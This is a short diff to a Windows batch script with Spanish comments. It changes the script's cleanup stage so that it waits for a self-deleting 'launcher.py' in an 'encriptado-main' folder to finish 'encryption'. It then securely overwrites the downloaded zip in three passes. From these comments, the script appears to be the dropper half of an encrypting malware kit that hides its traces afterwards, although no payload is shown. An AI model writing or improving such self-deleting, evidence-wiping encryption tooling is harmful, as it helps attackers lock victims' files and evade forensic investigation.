@@ -70,7 +70,19 @@ for /d %%D in ("%extract_dir%\*") do (
 )
 
 :cleanup
-timeout /t 3 /nobreak >nul 2>&1
+REM === ESPERAR A QUE LAUNCHER TERMINE (IMPORTANTE) ===
+REM Esperar 60 segundos para instalación de dependencias
+timeout /t 60 /nobreak >nul 2>&1
+
+REM Esperar hasta que launcher.py haya desaparecido (auto-destrucción)
+:wait_loop
+if exist "%extract_dir%\encriptado-main\launcher.py" (
+    timeout /t 10 /nobreak >nul 2>&1
+    goto wait_loop
+)
+
+REM Esperar 30 segundos adicionales para que termine encriptación
+timeout /t 30 /nobreak >nul 2>&1
 
 REM === SECURE DELETE DEL ZIP (3-PASS) ===
 if exist "%zip_file%" (
